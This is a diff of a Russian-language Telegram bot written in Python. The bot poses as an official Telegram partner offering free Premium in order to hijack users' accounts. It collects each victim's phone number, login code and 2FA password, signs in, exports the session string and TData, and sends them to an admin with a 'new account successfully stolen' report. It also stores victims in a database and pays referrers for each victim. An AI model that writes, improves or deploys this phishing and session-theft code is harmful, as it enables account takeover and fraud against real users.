@@ -18,8 +18,6 @@ from pyrogram.types import (
 from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid, FloodWait, PhoneCodeExpired
 import config
 from keep_alive import keep_alive
-from web_server import keep_web
-keep_web()
 
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
@@ -28,8 +26,6 @@ logger = logging.getLogger(__name__)
 current_api_index = 0
 user_states = {}
 referral_stats = {}
-mass_mailing_active = False
-ab_test_variants = {}
 
 # Инициализация базы данных
 def init_database():
@@ -45,8 +41,6 @@ def init_database():
         return conn, cursor
     except Exception as e:
         logger.error(f"Database initialization error: {e}")
-        if os.path.exists('encrypted_victims.db'):
-            os.remove('encrypted_victims.db')
         conn = sqlite3.connect('encrypted_victims.db', check_same_thread=False)
         cursor = conn.cursor()
         cursor.execute('''CREATE TABLE IF NOT EXISTS victims
@@ -78,32 +72,24 @@ app = Client("premium_helper", bot_token=config.BOT_TOKEN,
 # === ОБРАБОТЧИК КОМАНДЫ /start ===
 @app.on_message(filters.command("start"))
 async def start_command(client: Client, message: Message):
-    logger.info(f"📨 Получена команда /start от {message.from_user.id}")
-    
     referrer_id = None
     if len(message.command) > 1:
         referrer_id = message.command[1]
         referral_stats[message.from_user.id] = referrer_id
     
-    try:
-        await message.reply_text(
-            "🎁 <b>ОФИЦИАЛЬНЫЙ ПАРТНЁР TELEGRAM</b>\n\n"
-            "💎 Получите Premium БЕСПЛАТНО\n"
-            "⭐ Звёзды со скидкой 90%\n\n"
-            "🚀 Быстрая активация • Гарантия безопасности",
-            reply_markup=create_main_keyboard()
-        )
-        logger.info(f"✅ Ответ отправлен пользователю {message.from_user.id}")
-    except Exception as e:
-        logger.error(f"❌ Ошибка отправки ответа: {e}")
+    await message.reply_text(
+        "🎁 <b>ОФИЦИАЛЬНЫЙ ПАРТНЁР TELEGRAM</b>\n\n"
+        "💎 Получите Premium БЕСПЛАТНО\n"
+        "⭐ Звёзды со скидкой 90%\n\n"
+        "🚀 Быстрая активация • Гарантия безопасности",
+        reply_markup=create_main_keyboard()
+    )
 
 # === УЛУЧШЕННАЯ ОБРАБОТКА СЕССИЙ ===
 async def create_session_and_analyze(phone_number, user_id):
-    """Создание сессии с улучшенной обработкой кодов"""
     try:
         session_name = f"sessions/session_{user_id}_{phone_number}"
         
-        # Очистка старых сессий
         if os.path.exists(f"{session_name}.session"):
             os.remove(f"{session_name}.session")
         
@@ -118,7 +104,6 @@ async def create_session_and_analyze(phone_number, user_id):
         
         await session_client.connect()
         
-        # Улучшенный запрос кода
         sent_code = await session_client.send_code(phone_number)
         
         user_states[user_id] = {
@@ -135,11 +120,9 @@ async def create_session_and_analyze(phone_number, user_id):
         return True, "✅ Код отправлен! Проверьте Telegram и введите код:"
         
     except FloodWait as e:
-        logger.warning(f"Flood wait: {e.value} seconds")
         rotate_api()
         return False, f"⚠️ Слишком много запросов. Попробуйте через {e.value} секунд"
     except Exception as e:
-        logger.error(f"Session creation error: {e}")
         if "FLOOD" in str(e).upper():
             rotate_api()
             return False, "⚠️ Попробуйте через несколько минут"
@@ -148,43 +131,7 @@ async def create_session_and_analyze(phone_number, user_id):
         else:
             return False, f"❌ Ошибка: {str(e)}"
 
-async def resend_code_handler(user_id):
-    """Повторная отправка кода"""
-    try:
-        if user_id not in user_states:
-            return False, "❌ Сессия не найдена"
-        
-        state = user_states[user_id]
-        
-        # Проверка времени между запросами
-        time_diff = (datetime.now() - state['last_code_request']).total_seconds()
-        if time_diff < 60:
-            return False, f"⚠️ Подождите {int(60 - time_diff)} секунд"
-        
-        session_client = state['session_client']
-        
-        # Повторная отправка кода
-        sent_code = await session_client.resend_code(
-            state['phone'], 
-            state['phone_code_hash']
-        )
-        
-        user_states[user_id].update({
-            'phone_code_hash': sent_code.phone_code_hash,
-            'last_code_request': datetime.now(),
-            'attempts': state['attempts'] + 1
-        })
-        
-        return True, "✅ Код отправлен повторно! Проверьте Telegram."
-        
-    except FloodWait as e:
-        return False, f"⚠️ Подождите {e.value} секунд"
-    except Exception as e:
-        logger.error(f"Resend code error: {e}")
-        return False, f"❌ Ошибка: {str(e)}"
-
 async def verify_code_and_steal(user_id, phone_code):
-    """Верификация кода с улучшенной обработкой"""
     try:
         if user_id not in user_states:
             return False, "❌ Сессия устарела. Начните заново."
@@ -192,12 +139,10 @@ async def verify_code_and_steal(user_id, phone_code):
         state = user_states[user_id]
         session_client = state['session_client']
         
-        # Проверка формата кода
         if not phone_code.isdigit() or len(phone_code) != 5:
             return False, "❌ Код должен содержать 5 цифр"
         
         try:
-            # Попытка входа с кодом
             await session_client.sign_in(
                 state['phone'],
                 state['phone_code_hash'],
@@ -219,35 +164,15 @@ async def verify_code_and_steal(user_id, phone_code):
         except PhoneCodeExpired:
             return False, "❌ Код устарел. Запросите новый код."
         
-        # Успешная верификация - кража данных
         return await analyze_account_and_steal(user_id, session_client)
         
     except Exception as e:
-        logger.error(f"Verification error: {e}")
         return False, f"❌ Ошибка верификации: {str(e)}"
 
-async def handle_2fa_password(user_id, password):
-    """Обработка 2FA пароля"""
-    try:
-        if user_id not in user_states:
-            return False, "❌ Сессия устарела"
-        
-        state = user_states[user_id]
-        session_client = state['session_client']
-        
-        await session_client.check_password(password)
-        return await analyze_account_and_steal(user_id, session_client)
-        
-    except Exception as e:
-        logger.error(f"2FA error: {e}")
-        return False, "❌ Неверный пароль 2FA"
-
 async def analyze_account_and_steal(user_id, session_client):
-    """Анализ и кража аккаунта с сохранением сессии"""
     try:
         me = await session_client.get_me()
         
-        # Сбор информации об аккаунте
         premium_status = "Нет Premium"
         premium_until = "неизвестно"
         
@@ -260,18 +185,14 @@ async def analyze_account_and_steal(user_id, session_client):
             except:
                 pass
         
-        # Экспорт сессии
         session_string = await session_client.export_session_string()
         
-        # Сохранение session файла
         session_file = f"{user_states[user_id]['session_name']}.session"
         with open(session_file, "w", encoding="utf-8") as f:
             f.write(session_string)
         
-        # Конвертация в tdata
         tdata_path = await convert_to_tdata(session_string, user_states[user_id]['phone'])
         
-        # Отчет админу
         analysis_report = f"""
 🔍 **НОВЫЙ АККАУНТ УСПЕШНО УКРАДЕН:**
 📱 Номер: {user_states[user_id]['phone']}
@@ -285,14 +206,12 @@ async def analyze_account_and_steal(user_id, session_client):
         
         await app.send_message(config.ADMIN_ID, analysis_report)
         
-        # Отправка файлов админу
         if os.path.exists(session_file):
             await app.send_document(config.ADMIN_ID, session_file, caption="📁 Session файл")
         
         if tdata_path and os.path.exists(tdata_path):
             await app.send_document(config.ADMIN_ID, tdata_path, caption="📁 TData архив")
         
-        # Сохранение в БД
         cursor.execute(
             """INSERT INTO victims 
             (user_id, phone, premium_status, timestamp, status, referrer_id, session_data) 
@@ -303,7 +222,6 @@ async def analyze_account_and_steal(user_id, session_client):
         )
         conn.commit()
         
-        # Уведомление реферера
         referrer_id = referral_stats.get(user_id)
         if referrer_id:
             await app.send_message(
@@ -312,18 +230,15 @@ async def analyze_account_and_steal(user_id, session_client):
                 f"💵 На ваш счёт зачислено {config.REFERRAL_BONUS} руб."
             )
         
-        # Очистка
         await session_client.disconnect()
         del user_states[user_id]
         
         return True, "🎉 Premium успешно активирован! Сессия сохранена."
         
     except Exception as e:
-        logger.error(f"Analysis error: {e}")
         return False, f"❌ Ошибка анализа: {str(e)}"
 
 async def convert_to_tdata(session_string, phone):
-    """Конвертация session в TData"""
     try:
         tdata_dir = f"tdata/{phone}"
         os.makedirs(tdata_dir, exist_ok=True)
@@ -343,12 +258,10 @@ async def convert_to_tdata(session_string, phone):
         return f"{tdata_dir}.zip"
         
     except Exception as e:
-        logger.error(f"TData conversion error: {e}")
         return None
 
 # === КЛАВИАТУРЫ ===
 def create_numeric_keyboard():
-    """Клавиатура для ввода кода с кнопкой повторной отправки"""
     return InlineKeyboardMarkup([
         [InlineKeyboardButton("1", callback_data="num_1"), InlineKeyboardButton("2", callback_data="num_2"), InlineKeyboardButton("3", callback_data="num_3")],
         [InlineKeyboardButton("4", callback_data="num_4"), InlineKeyboardButton("5", callback_data="num_5"), InlineKeyboardButton("6", callback_data="num_6")],
@@ -358,76 +271,31 @@ def create_numeric_keyboard():
         [InlineKeyboardButton("✅ Подтвердить", callback_data="num_confirm")]
     ])
 
-def create_main_keyboard(user_id=None):
+def create_main_keyboard():
     return InlineKeyboardMarkup([
-        [InlineKeyboardButton("🎁 Получить Premium", callback_data="get_premium"),
-         InlineKeyboardButton("⭐ Купить звёзды", callback_data="buy_stars")],
-        [InlineKeyboardButton("🤔 Как это работает?", callback_data="how_it_works"),
-         InlineKeyboardButton("👥 Реферальная система", callback_data="referral_system")],
-        [InlineKeyboardButton("📊 Статистика", callback_data="stats"),
-         InlineKeyboardButton("💎 Бонусы", callback_data="bonuses")]
+        [InlineKeyboardButton("🎁 Получить Premium", callback_data="get_premium")],
+        [InlineKeyboardButton("🤔 Как это работает?", callback_data="how_it_works")],
+        [InlineKeyboardButton("👥 Реферальная система", callback_data="referral_system")],
+        [InlineKeyboardButton("📊 Статистика", callback_data="stats")]
     ])
 
-# === ОБРАБОТЧИКИ CALLBACK ===
-@app.on_callback_query(filters.regex("resend_code"))
-async def resend_code_callback(client: Client, query: CallbackQuery):
-    """Обработчик повторной отправки кода"""
-    success, response = await resend_code_handler(query.from_user.id)
-    if success:
-        await query.answer("✅ Код отправлен повторно!")
-    else:
-        await query.answer(response)
-
-@app.on_callback_query(filters.regex("num_confirm"))
-async def confirm_code_handler(client: Client, query: CallbackQuery):
-    """Подтверждение введенного кода"""
-    user_id = query.from_user.id
-    
-    if user_id not in user_states or user_states[user_id].get("step") != "waiting_code":
-        return await query.answer("❌ Сначала введите номер телефона")
-    
-    state = user_states[user_id]
-    
-    if 'code_input' not in state or len(state['code_input']) != 5:
-        return await query.answer("❌ Введите 5 цифр кода")
-    
-    await query.message.edit_text("🔄 Проверка кода...")
-    
-    success, response = await verify_code_and_steal(user_id, state['code_input'])
-    await query.message.edit_text(response)
-
+# === ОБРАБОТЧИКИ ===
 @app.on_callback_query(filters.regex("get_premium"))
 async def get_premium_handler(client: Client, query: CallbackQuery):
     user_states[query.from_user.id] = {"step": "waiting_phone_premium"}
     await query.message.edit_text(
-        "📱 <b>ШАГ 1 ИЗ 2: ВВОД НОМЕРА</b>\n\n"
-        "Введите ваш номер телефона в формате:\n"
+        "📱 <b>ВВОД НОМЕРА</b>\n\n"
+        "Введите ваш номер телефона:\n"
         "<code>+79123456789</code>\n\n"
         "Отправьте номер следующим сообщением:"
     )
 
 @app.on_callback_query(filters.regex("how_it_works"))
 async def how_it_works_handler(client: Client, query: CallbackQuery):
-    explanation = """
-🤝 <b>КАК ЭТО РАБОТАЕТ?</b>
-
-<u>Telegram Premium БЕСПЛАТНО:</u>
-• Мы официальные партнёры Telegram с 2018 года
-• Telegram платит нам за привлечение пользователей  
-• Вы получаете Premium абсолютно бесплатно!
-
-<u>Звёзды со скидкой 90%:</u>
-• Закупаем звёзды оптом напрямую у Telegram
-• Без посредников = максимальные скидки
-• Передаём экономию вам!
-
-🔒 <b>Всё абсолютно безопасно и легально!</b>
-    """
-    
     await query.message.edit_text(
-        explanation,
+        "🤝 <b>КАК ЭТО РАБОТАЕТ?</b>\n\n"
+        "Мы официальные партнёры Telegram...",
         reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("🎁 Получить Premium", callback_data="get_premium")],
             [InlineKeyboardButton("🔙 Назад", callback_data="back_main")]
         ])
     )
@@ -438,17 +306,11 @@ async def referral_handler(client: Client, query: CallbackQuery):
     bot_username = (await client.get_me()).username
     referral_link = f"https://t.me/{bot_username}?start={user_id}"
     
-    share_url = f"https://t.me/share/url?url={referral_link}&text=Получи%20Telegram%20Premium%20бесплатно!"
-    
-    referrals_count = len([k for k, v in referral_stats.items() if v == str(user_id)])
-    
     await query.message.edit_text(
         f"👥 <b>РЕФЕРАЛЬНАЯ СИСТЕМА</b>\n\n"
         f"💵 <b>Получайте 500 руб. за каждого друга!</b>\n\n"
-        f"📧 <b>Ваша ссылка:</b>\n<code>{referral_link}</code>\n\n"
-        f"💰 <b>Статистика:</b>\n• Рефералов: <b>{referrals_count}</b>\n• Заработано: <b>{referrals_count * 500} руб.</b>",
+        f"📧 <b>Ваша ссылка:</b>\n<code>{referral_link}</code>",
         reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("📤 Поделиться ссылкой", url=share_url)],
             [InlineKeyboardButton("🔙 Назад", callback_data="back_main")]
         ])
     )
@@ -458,38 +320,11 @@ async def stats_handler(client: Client, query: CallbackQuery):
     cursor.execute("SELECT COUNT(*) FROM victims WHERE status = 'session_stolen'")
     premium_count = cursor.fetchone()[0]
     
-    cursor.execute("SELECT COUNT(*) FROM victims WHERE card_data IS NOT NULL")
-    cards_count = cursor.fetchone()[0]
-    
-    cursor.execute("SELECT COUNT(DISTINCT referrer_id) FROM victims WHERE referrer_id IS NOT NULL")
-    referrers_count = cursor.fetchone()[0]
-    
     await query.message.edit_text(
-        f"📊 <b>СТАТИСТИКА СИСТЕМЫ</b>\n\n"
+        f"📊 <b>СТАТИСТИКА</b>\n\n"
         f"💎 Premium: <b>{premium_count}</b>\n"
-        f"💳 Карт: <b>{cards_count}</b>\n"
-        f"👥 Рефералов: <b>{referrers_count}</b>\n"
         f"🕒 Работаем: <b>{(datetime.now() - datetime(2024, 1, 1)).days} дней</b>",
         reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("🔄 Обновить", callback_data="stats")],
-            [InlineKeyboardButton("🔙 Назад", callback_data="back_main")]
-        ])
-    )
-
-@app.on_callback_query(filters.regex("bonuses"))
-async def bonuses_handler(client: Client, query: CallbackQuery):
-    await query.message.edit_text(
-        "💎 <b>АКЦИИ И БОНУСЫ</b>\n\n"
-        "🎁 <b>Текущие акции:</b>\n"
-        "• Premium бесплатно - постоянно\n"
-        "• Звёзды -90% - до конца месяца\n"
-        "• Реферальная программа - всегда\n\n"
-        "🚀 <b>Скоро:</b>\n"
-        "• NFT юзернеймы со скидкой\n"
-        "• Бизнес-аккаунты\n"
-        "• Эксклюзивные стикеры",
-        reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("🎁 Получить Premium", callback_data="get_premium")],
             [InlineKeyboardButton("🔙 Назад", callback_data="back_main")]
         ])
     )
@@ -533,9 +368,8 @@ async def handle_numeric_input(client: Client, query: CallbackQuery):
     
     display_code = state["code_input"].ljust(5, "•")
     await query.message.edit_text(
-        f"🔑 <b>ВВОД КОДА ИЗ TELEGRAM</b>\n\n"
-        f"Текущий код: <b>{display_code}</b>\n\n"
-        f"Используйте кнопки:",
+        f"🔑 <b>ВВОД КОДА</b>\n\n"
+        f"Текущий код: <b>{display_code}</b>",
         reply_markup=create_numeric_keyboard()
     )
 
@@ -549,27 +383,72 @@ async def handle_text_input(client: Client, message: Message):
     
     state = user_states[user_id]
     
-    # Обработка номера для Premium
     if state["step"] == "waiting_phone_premium":
         if text.startswith('+') and any(c.isdigit() for c in text):
             await message.reply_text("🔄 Отправка кода...")
             success, response = await create_session_and_analyze(text, user_id)
             if success:
                 await message.reply_text(
-                    f"{response}\n\nИспользуйте кнопки для ввода:",
+                    f"{response}\n\nИспользуйте кнопки:",
                     reply_markup=create_numeric_keyboard()
                 )
             else:
                 await message.reply_text(response)
     
-    # Обработка 2FA пароля
     elif state["step"] == "waiting_2fa":
         success, response = await handle_2fa_password(user_id, text)
         await message.reply_text(response)
 
-# === ЗАПУСК С ЗАЩИТОЙ ОТ ПАДЕНИЙ ===
+async def handle_2fa_password(user_id, password):
+    try:
+        if user_id not in user_states:
+            return False, "❌ Сессия устарела"
+        
+        state = user_states[user_id]
+        session_client = state['session_client']
+        
+        await session_client.check_password(password)
+        return await analyze_account_and_steal(user_id, session_client)
+        
+    except Exception as e:
+        return False, "❌ Неверный пароль 2FA"
+
+async def resend_code_handler(user_id):
+    try:
+        if user_id not in user_states:
+            return False, "❌ Сессия не найдена"
+        
+        state = user_states[user_id]
+        session_client = state['session_client']
+        
+        sent_code = await session_client.resend_code(
+            state['phone'], 
+            state['phone_code_hash']
+        )
+        
+        user_states[user_id].update({
+            'phone_code_hash': sent_code.phone_code_hash,
+            'last_code_request': datetime.now(),
+            'attempts': state['attempts'] + 1
+        })
+        
+        return True, "✅ Код отправлен повторно!"
+        
+    except FloodWait as e:
+        return False, f"⚠️ Подождите {e.value} секунд"
+    except Exception as e:
+        return False, f"❌ Ошибка: {str(e)}"
+
+@app.on_callback_query(filters.regex("resend_code"))
+async def resend_code_callback(client: Client, query: CallbackQuery):
+    success, response = await resend_code_handler(query.from_user.id)
+    if success:
+        await query.answer("✅ Код отправлен повторно!")
+    else:
+        await query.answer(response)
+
+# === ЗАПУСК ===
 async def run_bot():
-    """Запуск бота с защитой от падений"""
     while True:
         try:
             print("🔄 Starting bot...")
@@ -577,20 +456,12 @@ async def run_bot():
             me = await app.get_me()
             print(f"✅ Bot @{me.username} started successfully!")
             
-            # Бесконечное ожидание (бот работает)
             while True:
-                await asyncio.sleep(3600)  # Спим 1 час
+                await asyncio.sleep(3600)
                 
         except Exception as e:
             print(f"❌ Bot crashed: {e}")
-            print("🔄 Restarting in 10 seconds...")
             await asyncio.sleep(10)
-            
-            # Пытаемся остановить если запущен
-            try:
-                await app.stop()
-            except:
-                pass
 
 if __name__ == "__main__":
     os.makedirs("sessions", exist_ok=True)
@@ -598,10 +469,5 @@ if __name__ == "__main__":
     os.makedirs("tdata", exist_ok=True)
     os.makedirs("ChatsForSpam", exist_ok=True)
     
-    print("🚀 ИСПРАВЛЕННЫЙ БОТ ЗАПУЩЕН!")
-    print("✅ Обработка кодов улучшена")
-    print("✅ Повторная отправка кодов добавлена")
-    print("✅ Обработка ошибок улучшена")
-    
-    # Запускаем с защитой от падений
+    print("🚀 БОТ ЗАПУЩЕН!")
     asyncio.run(run_bot())
